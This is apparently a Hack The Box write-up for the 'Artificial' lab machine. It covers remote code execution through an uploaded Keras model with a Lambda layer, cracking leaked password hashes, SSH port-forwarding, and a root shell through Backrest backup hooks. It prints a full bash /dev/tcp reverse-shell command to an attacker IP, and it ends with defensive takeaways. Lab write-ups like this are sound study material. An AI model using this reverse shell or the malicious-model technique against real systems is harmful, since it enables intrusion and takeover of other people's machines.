@@ -1,0 +1,110 @@
+Title: Artificial
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Artificial was a Linux box centered on an "AI Solutions" web app that lets users upload a Keras/TensorFlow model file for it to run predictions on. Keras `.h5` model files can embed a `Lambda` layer containing arbitrary Python, so a malicious model achieves code execution the moment the app loads it and calls predict. That foothold as the app's service account exposes a SQLite users database with crackable password hashes, one of which grants SSH access. From there, a locally-bound Backrest backup service is reachable via SSH port-forwarding, and a leaked backup archive contains a bcrypt hash for the Backrest admin account. Cracking that hash and logging in exposes Backrest's repo/plan hooks, which run arbitrary shell commands as root whenever a backup executes.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.74
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+> nmap -sC -sV -p22,80 10.10.11.74
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://artificial.htb/
+```
+
+Port 80 redirects to `artificial.htb` and hosts an "AI Solutions" site that lets registered users upload a model file and view its predictions.
+
+## Foothold - Malicious Keras Model (TensorFlow RCE)
+
+The site's own documentation included example Python for building and uploading a model, which pointed toward a known class of TensorFlow/Keras deserialization vulnerabilities (see https://mastersplinter.work/research/tensorflow-rce/) where a `Lambda` layer embedded in a saved `.h5` model runs attacker-supplied Python whenever the model is loaded or invoked for a prediction.
+
+- A Docker container running TensorFlow was used to build the exploit, keeping the malicious dependency isolated from the host environment.
+- The container built a Sequential model containing a `Lambda` layer whose function calls `os.system()` with a reverse shell one-liner, then saved the model as `exploit.h5`.
+- The resulting `exploit.h5` was copied out of the container and uploaded through the site's model-upload feature.
+- Clicking "View Predictions" on the uploaded model triggered Keras to load and evaluate it, executing the embedded `Lambda` layer and popping a reverse shell as the `app` service account.
+
+## Credential Harvesting
+
+On the box, a `users.db` SQLite file was found containing application data. Running `strings` against it revealed a set of password hashes, one of which was cracked via CrackStation:
+
+```
+gael:mattp005numbertwo
+```
+
+## Lateral Movement - SSH as gael
+
+```
+> ssh gael@10.10.11.74
+```
+
+The cracked credentials worked directly over SSH, giving an interactive shell as `gael` and access to the user flag.
+
+## Internal Service Discovery
+
+Running linpeas.sh from `gael`'s shell surfaced two internally-bound services not reachable from outside the box:
+
+```
+tcp   127.0.0.1:5000   LISTEN
+tcp   127.0.0.1:9898   LISTEN
+```
+
+A `/var/backups` directory also contained a `backrest_backup.tar.gz` archive, which turned out to be relevant to the service on port 9898.
+
+Port-forwarding both ports over SSH and re-scanning them locally confirmed:
+
+```
+> ssh -N -L 5000:localhost:5000 -L 9898:localhost:9898 gael@10.10.11.74
+> nmap -sC -sV -p5000,9898 localhost
+5000/tcp open  http    Gunicorn 20.0.4
+|_http-title: Artificial - AI Solutions
+9898/tcp open  http    Golang net/http server
+|_http-title: Backrest
+```
+
+Port 5000 is simply the same "AI Solutions" app bound locally; port 9898 is a Backrest 1.7.2 instance behind a login page.
+
+## Cracking the Backrest Admin Hash
+
+Extracting the backup archive found earlier exposed Backrest's own configuration, including a bcrypt hash for its built-in admin account:
+
+```
+> tar -xvf /var/backups/backrest_backup.tar.gz -C /tmp
+> cat /tmp/backrest/.config/backrest/config.json
+        "name": "backrest_root",
+        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
+```
+
+The value is base64-encoded on top of the bcrypt hash, so it was decoded first and then cracked with hashcat's bcrypt mode against rockyou.txt:
+
+```
+> echo JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 --decode
+$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
+> hashcat -m 3200 hash.txt rockyou.txt
+!@#$%^
+```
+
+Logging into Backrest at `localhost:9898` as `backrest_root` with the cracked password `!@#$%^` succeeded.
+
+## Privilege Escalation - Backrest Hook RCE
+
+Backrest lets a repo define hooks that run a shell command on backup-related events. Since the Backrest service itself runs as root, any command placed in a hook executes with root privileges:
+
+- A new repo was created, and under its hooks a condition set to trigger on all events was added with the command `/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.194/443 0>&1'`.
+- A plan was created using that repo, and running "Backup Now" fired the hook.
+- A netcat listener on the attacking machine caught the resulting connection as a root shell.
+
+## Takeaways
+
+- Keras/TensorFlow `.h5` model files are not inert data - a `Lambda` layer can embed arbitrary Python that executes the moment the model is loaded or run, so any app that lets users upload and evaluate model files is effectively allowing code upload.
+- Flat-file application databases (SQLite, etc.) left readable to a compromised service account are a common source of crackable credentials for other accounts on the box.
+- Locally-bound admin services discovered via linpeas (and reachable through SSH port-forwarding) are worth targeting even when they appear behind a login page - leftover backup archives can leak the exact credentials needed to get in.
+- Backup/automation tools that support arbitrary hook or pre/post-command execution (like Backrest's repo hooks) are a direct root-equivalent code execution primitive once you have valid credentials for the service, if that service itself runs with elevated privileges.
